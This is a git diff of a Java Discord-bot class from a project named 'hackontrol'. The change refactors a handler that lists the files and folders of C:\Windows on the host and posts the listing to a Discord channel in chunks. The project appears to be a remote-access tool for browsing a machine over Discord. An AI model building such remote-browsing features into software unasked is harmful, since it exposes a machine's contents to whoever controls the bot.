@@ -1,6 +1,8 @@
 package com.khopan.hackontrol.channel.file;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -14,7 +16,9 @@ import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
 import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
+import net.dv8tion.jda.api.requests.restaction.MessageCreateAction;
 import net.dv8tion.jda.api.requests.restaction.interactions.ReplyCallbackAction;
+import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
 public class FileChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "file";
@@ -39,34 +43,90 @@ public class FileChannel extends HackontrolChannel {
 	}
 
 	private void query(ButtonInteraction interaction) {
-		this.filePointer = new File("D:\\GitHub Repository\\");
-		File[] fileList = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();
-		List<String> messageList = new ArrayList<>();
+		this.filePointer = new File("C:\\Windows");
 		StringBuilder builder = new StringBuilder();
+		File[] files = this.filePointer == null ? File.listRoots() : this.filePointer.listFiles();
+
+		if(files == null || files.length == 0) {
+			ErrorUtils.sendErrorReply(interaction, new InternalError("Empty file list"));
+			return;
+		}
+
+		List<File> fileList = new ArrayList<>();
+		List<File> folderList = new ArrayList<>();
+
+		for(int i = 0; i < files.length; i++) {
+			File file = files[i];
+
+			if(!file.exists()) {
+				continue;
+			}
+
+			if(file.isFile()) {
+				fileList.add(file);
+			}
+
+			if(file.isDirectory()) {
+				folderList.add(file);
+			}
+		}
+
+		if(fileList.isEmpty() && folderList.isEmpty()) {
+			ErrorUtils.sendErrorReply(interaction, new InternalError("No files available"));
+			return;
+		}
+
+		int ordinal = 1;
 		builder.append("**");
-		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath());
+		builder.append(this.filePointer == null ? "SYSTEMROOT" : this.filePointer.getAbsolutePath().replace("\\", "\\\\"));
 		builder.append("**");
 
-		if(fileList != null && fileList.length > 0) {
-			for(int i = 0; i < fileList.length; i++) {
-				File file = fileList[i];
-				String entry = "\n" + (i + 1) + ") `" + file.getName() + '`';
+		if(!fileList.isEmpty()) {
+			builder.append("\n**File**");
 
-				if(builder.length() + entry.length() > 400) {
+			for(int i = 0; i < fileList.size(); i++) {
+				builder.append('\n');
+				builder.append(ordinal++);
+				builder.append(") `");
+				builder.append(fileList.get(i).getName());
+				builder.append('`');
+			}
+		}
+
+		if(!folderList.isEmpty()) {
+			builder.append("\n**Folder**");
+
+			for(int i = 0; i < folderList.size(); i++) {
+				builder.append('\n');
+				builder.append(ordinal++);
+				builder.append(") `");
+				builder.append(folderList.get(i).getName());
+				builder.append('`');
+			}
+		}
+
+		BufferedReader reader = new BufferedReader(new StringReader(builder.toString()));
+		builder = new StringBuilder();
+		List<String> messageList = new ArrayList<>();
+		String line;
+
+		try {
+			while((line = reader.readLine()) != null) {
+				line += '\n';
+
+				if(builder.length() + line.length() > 2000) {
 					messageList.add(builder.toString());
 					builder = new StringBuilder();
 				}
 
-				builder.append(entry);
+				builder.append(line);
 			}
-		}
 
-		if(!builder.isEmpty()) {
-			messageList.add(builder.toString());
-		}
-
-		if(messageList.isEmpty()) {
-			ErrorUtils.sendErrorReply(interaction, new InternalError("No files available"));
+			if(!builder.isEmpty()) {
+				messageList.add(builder.toString());
+			}
+		} catch(Throwable Errors) {
+			ErrorUtils.sendErrorReply(interaction, Errors);
 			return;
 		}
 
@@ -74,18 +134,21 @@ public class FileChannel extends HackontrolChannel {
 		MessageChannelUnion channel = Event.getChannel();
 		String firstBatch = messageList.get(0);
 		messageList.remove(0);
-		ReplyCallbackAction action = Event.reply(firstBatch);
+		ReplyCallbackAction replyCallbackAction = Event.reply(firstBatch);
 
 		if(messageList.isEmpty()) {
-			action.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete")).queue();
+			this.configActionRow(replyCallbackAction);
+			replyCallbackAction.queue();
 			return;
 		}
 
-		action.queue(hook -> hook.retrieveOriginal().queue(message -> new Thread(() -> {
+		replyCallbackAction.queue(hook -> hook.retrieveOriginal().queue(message -> new Thread(() -> {
 			int size = messageList.size();
+			MessageCreateAction messageCreateAction;
 
 			if(size == 1) {
-				channel.sendMessage(messageList.get(0)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", message.getIdLong())).queue();
+				messageCreateAction = channel.sendMessage(messageList.get(0));
+				this.configActionRow(messageCreateAction, message.getIdLong());
 			} else {
 				Object[] identifierList = new Object[size];
 				identifierList[0] = message.getIdLong();
@@ -94,8 +157,15 @@ public class FileChannel extends HackontrolChannel {
 					identifierList[i] = channel.sendMessage(messageList.get(i - 1)).complete().getIdLong();
 				}
 
-				channel.sendMessage(messageList.get(size - 1)).addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", identifierList)).queue();
+				messageCreateAction = channel.sendMessage(messageList.get(size - 1));
+				this.configActionRow(messageCreateAction, identifierList);
 			}
+
+			messageCreateAction.queue();
 		}).start()));
+	}
+
+	private void configActionRow(MessageCreateRequest<?> request, Object... messageIdentifiers) {
+		request.addActionRow(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete", messageIdentifiers));
 	}
 }
